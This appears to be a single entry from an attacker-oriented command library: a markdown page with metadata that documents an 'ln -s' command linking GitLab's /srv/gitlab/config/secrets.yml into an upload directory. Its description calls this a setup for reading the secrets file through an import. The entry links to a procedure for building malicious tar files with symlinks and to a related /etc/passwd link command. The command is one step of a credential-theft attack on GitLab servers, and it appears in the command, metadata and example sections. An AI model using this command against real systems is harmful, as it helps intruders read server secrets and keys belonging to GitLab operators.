---
id: 4f61acde-9d45-4287-819a-b57cae85d326
type: command
executor: bash
data: >-
  ln -s /srv/gitlab/config/secrets.yml
  ./d3209c811fee407218bff7cb3b4333e6/secrets.yml
output: null
created_at: '2025-12-11T03:48:05.896Z'
updated_at: '2025-12-11T03:48:05.896Z'
platforms:
  - Linux
tags:
  - symlink
verified: false
validated: true
submitted: true
---

# ln-symlink-secrets

## Command

```bash
ln -s /srv/gitlab/config/secrets.yml ./d3209c811fee407218bff7cb3b4333e6/secrets.yml
```

## Description

Create a symbolic link to /srv/gitlab/config/secrets.yml inside the directory, setting up for reading GitLab's secrets file via import.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Create symbolic link | Yes |
| `/srv/gitlab/config/secrets.yml` | Target file | Yes |
| `./d3209c811fee407218bff7cb3b4333e6/secrets.yml` | Symlink path | Yes |

## Examples

### Basic Usage

```bash
ln -s /srv/gitlab/config/secrets.yml ./d3209c811fee407218bff7cb3b4333e6/secrets.yml
```

## Expected Output

Creates the symlink without output if successful.

## Related

- [[procedures/Create-Malicious-Tar-File-with-Symlinks]]
- [[commands/ln-symlink-passwd]]
